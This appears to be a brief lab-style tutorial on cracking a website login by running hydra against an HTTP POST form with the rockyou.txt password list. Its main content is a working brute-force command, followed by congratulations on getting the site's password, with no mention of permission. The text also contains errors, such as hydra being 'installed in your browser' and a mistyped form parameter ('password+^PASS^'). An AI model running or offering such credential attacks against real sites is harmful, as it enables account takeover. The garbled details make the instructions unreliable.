1) If you have not yet installed hydra or it's not already installed in your browser
   type "sudo apt install hydra" in your terminal.

2) If you use kali linux go in usr/share/wordlists and rockyou.txt,
   there are millions and millions of common passwords in that file, if you haven't already installed it, you can search for it online.

3) Then to find the password of the site digit:
   "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <IP OF THE SITE(ex: 10.10.177.34)> http-post-form "/login:username=^USER^&password+^PASS^:Your username or password is incorrect."

4) When hydra has finished the operation the password will appear in blue in the terminal.

Now you have the password of that site!👏👋
